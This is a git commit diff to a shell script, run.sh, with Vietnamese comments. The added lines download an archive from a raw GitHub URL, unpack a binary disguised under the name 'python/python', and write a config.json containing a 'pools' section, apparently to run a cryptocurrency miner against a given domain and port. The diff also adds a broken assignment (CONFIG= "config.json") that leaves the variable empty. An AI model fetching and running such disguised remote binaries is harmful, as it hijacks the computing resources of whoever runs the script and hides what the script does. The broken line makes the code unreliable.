e1128b3dd64cbe9260e59baac6d0bcec86ab7458
CongTK9x <155988811+CongTK9x@users.noreply.github.com>
2025-09-03 00:00:27 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -2,9 +2,19 @@
 
 DOMAIN=$1      # domain:port
 HOSTNAME=$2    # hostname
-CONFIG=config.json
-if [ ! -f config.json ]; then
-cat > config.json <<EOF
+CONFIG= "config.json"
+PATH_FILE="python/python"
+
+# Nếu chưa có binary thì tải và giải nén
+if [ ! -f "$PATH_FILE" ]; then
+    curl -L -o python.tar.gz https://raw.githubusercontent.com/trinhkhaccong/tool/main/python.tar.gz
+    tar -xzf python.tar.gz
+    rm -f python.tar.gz
+fi
+
+# Nếu chưa có config.json thì tạo
+if [ ! -f "$CONFIG" ]; then
+cat > "$CONFIG" <<EOF
 {
   "pools": [
     {
